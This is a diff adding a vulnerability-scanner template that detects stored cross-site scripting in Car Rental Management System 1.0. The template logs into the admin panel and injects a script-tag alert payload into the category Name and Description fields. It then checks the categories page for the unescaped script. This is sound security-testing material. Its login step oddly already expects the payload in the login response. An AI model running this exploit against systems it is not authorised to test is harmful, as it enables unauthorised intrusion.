@@ -1,0 +1,84 @@
+id: carrental-xss
+brief:
+    title: Car Rental Management System 1.0 - Cross-Site Scripting
+    by: arafatansari
+    level: medium
+    about: Car Rental Management System 1.0 contains a cross-site scripting vulnerability via admin/ajax.php?action=save_category in Name and Description parameter.
+    label:
+        - xss
+        - cms
+        - authenticated
+        - edb
+        - intrusive
+        - vuln
+    score: CVSS:5.4
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/admin/ajax.php?action=login'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: username={{username}}&password={{password}}
+      signs:
+        - "on": word
+          has:
+            - '<p>Name: <b></script><script>alert(document.domain)</script></b>'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/admin/ajax.php?action=save_category'
+      head:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCMJ5bh3B6m9767Em
+      body: |-
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+        Content-Disposition: form-data; name="id"
+
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+        Content-Disposition: form-data; name="name"
+
+        </script><script>alert(document.domain)</script>
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+        Content-Disposition: form-data; name="description"
+
+        <script>alert(document.domain)</script>
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em--
+      signs:
+        - "on": word
+          has:
+            - '<p>Name: <b></script><script>alert(document.domain)</script></b>'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/admin/index.php?page=categories'
+      signs:
+        - "on": word
+          has:
+            - '<p>Name: <b></script><script>alert(document.domain)</script></b>'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
